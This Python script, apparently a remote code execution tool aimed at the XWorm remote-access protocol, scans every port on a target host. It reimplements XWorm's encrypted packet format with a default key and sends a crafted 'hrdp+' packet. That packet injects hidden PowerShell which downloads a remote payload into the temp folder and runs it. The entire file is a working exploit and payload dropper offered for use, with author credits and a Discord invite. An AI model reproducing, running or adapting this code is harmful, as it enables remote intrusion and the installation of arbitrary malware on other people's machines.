import socket
import io
import random
import string
import hashlib
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from colorama import Fore, Style, init
import platform
import sys
from concurrent.futures import ThreadPoolExecutor

init()

def clear_screen():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

class Packet:
    def __init__(self, data: list[bytes]):
        self.data = data

    def write_bytes(self, into):
        into.write(b'<Xwormmm>'.join(self.data))

    def get_bytes(self):
        b = io.BytesIO()
        self.write_bytes(b)
        return b.getbuffer().tobytes()

def genid(length):
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length))

def sendpacket(sock, packet, key):
    try:
        key_hash = hashlib.md5(key.encode('utf-8')).digest()
        crypto = AES.new(key_hash, AES.MODE_ECB)
        data = packet.get_bytes()
        encrypted = crypto.encrypt(pad(data, 16))
        sock.send(str(len(encrypted)).encode('utf-8') + b'\x00')
        sock.send(encrypted)
        return encrypted
    except Exception as e:
        print(Fore.RED + "[!] Encryption/transmission error: " + str(e) + Fore.RESET)

def rce(host, port, key, file_url):
    client_id = genid(16)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        print(Fore.RED + f"[*] Connecting to {host}:{port}..." + Fore.RESET)
        sock.connect((host, port))
        print(Fore.RED + f"[+] Target {host}:{port} is online!" + Fore.RESET)

        handshake_packet = Packet([b'hrdp', client_id.encode('utf-8')])
        if not sendpacket(sock, handshake_packet, key):
            sock.close()
            return False

        file_extension = '.bat' if file_url.lower().endswith('.bat') else '.exe'
        random_filename = genid(5) + file_extension

        print(Fore.RED + f"[*] Downloading payload from: {file_url}" + Fore.RESET)

        if file_extension == '.bat':
            ps_command = f'start powershell.exe -WindowStyle Hidden $url = "{file_url}"; $outputPath = "$env:TEMP\\{random_filename}"; Invoke-WebRequest -Uri $url -OutFile $outputPath; Start-Process -FilePath \'cmd.exe\' -ArgumentList \'/c\', $outputPath'
        else:
            ps_command = f'''start powershell.exe -WindowStyle Hidden $url = "{file_url}"; $outputPath = "$env:TEMP\\{random_filename}"; Invoke-WebRequest -Uri $url -OutFile $outputPath; Start-Sleep -s 3; cmd.exe /c start "" $outputPath'''

        exploit_packet = Packet([
            b'hrdp+',
            client_id.encode('utf-8'),
            b' lol',
            f'" & {ps_command}'.encode('utf-8'),
            b'1:1'
        ])
        if not sendpacket(sock, exploit_packet, key):
            sock.close()
            return False

        print(Fore.RED + "[+] Payload sent successfully to target!" + Fore.RESET)
        sock.close()
        return True
    except socket.timeout:
        print(Fore.RED + "[!] Target is offline (connection timeout)" + Fore.RESET)
    except ConnectionRefusedError:
        print(Fore.RED + "[!] Target is offline (connection refused)" + Fore.RESET)
    except Exception as e:
        print(Fore.RED + "[!] Connection error: " + str(e) + Fore.RESET)
    finally:
        try:
            sock.close()
        except:
            pass
    return False

def scan_port(ip, port, key, file_url):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.5)
            result = s.connect_ex((ip, port))
            if result == 0:
                print(f"[+] {ip}:{port} is open")
                print(Fore.RED + f"[+] Running payload on open port {port}" + Fore.RESET)
                if rce(ip, port, key, file_url):
                    print(Fore.RED + "[+] Execution completed successfully" + Fore.RESET)
            else:
                print(f"[-] {ip}:{port} is closed")
    except Exception:
        pass

def scan_host(ip, port_range, key, file_url):
    print(f"[*] Scanning {ip} from port {port_range[0]} to {port_range[-1]}...")
    with ThreadPoolExecutor(max_workers=100) as executor:
        for port in port_range:
            executor.submit(scan_port, ip, port, key, file_url)

def get_connection_details():
    try:
        print(Fore.RED + "[+] Please enter connection details:" + Fore.RESET)
        host = input(Fore.RED + "[+] Enter IP-Address/Hostname. Example: (127.0.0.1): " + Fore.RESET)
        port = int(input(Fore.RED + "[+] Enter Port Example: (4004): " + Fore.RESET))
        key = input(Fore.RED + "[+] Encryption key default (<123456789>): " + Fore.RESET) or "<123456789>"
        file_url = input(Fore.RED + "[+] Payload URL to download: " + Fore.RESET)
        return host, port, key, file_url
    except ValueError:
        print(Fore.RED + "[!] Invalid port number" + Fore.RESET)
        return None, None, None, None

def show_banner():
    print(Fore.RED + r"""
     ▄████████  ▄████████    ▄████████    ▄██████▄     ▄████████ ███▄▄▄▄   
     ███    ███ ███    ███   ███    ███   ███    ███   ███    ███ ███▀▀▀██▄ 
     ███    ███ ███    █▀    ███    █▀    ███    █▀    ███    █▀  ███   ███ 
    ▄███▄▄▄▄██▀ ███         ▄███▄▄▄      ▄███         ▄███▄▄▄     ███   ███ 
   ▀▀███▀▀▀▀▀   ███        ▀▀███▀▀▀     ▀▀███ ████▄  ▀▀███▀▀▀     ███   ███ 
   ▀███████████ ███    █▄    ███    █▄    ███    ███   ███    █▄  ███   ███ 
     ███    ███ ███    ███   ███    ███   ███    ███   ███    ███ ███   ███ 
     ███    ███ ████████▀    ██████████   ████████▀    ██████████  ▀█   █▀  
     ███    ███                                                             
                            Dev By : afyouna.py | Occ'x
                             Discord : discord.gg/occx 
""" + Fore.RESET)

def main():
    clear_screen()
    show_banner()
    host, port, key, file_url = get_connection_details()
    if None in (host, port, key, file_url):
        return
    print(Fore.RED + f"\n[?] Attempting to connect to {host}:{port}" + Fore.RESET)
    print(Fore.RED + f"[?] Using encryption key: {key}" + Fore.RESET)
    print(Fore.RED + f"[?] Payload URL: {file_url}" + Fore.RESET)
    scan_host(host, range(1, 65536), key, file_url)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Operation cancelled by user")
    except Exception as e:
        print("[!] Critical error:", str(e))
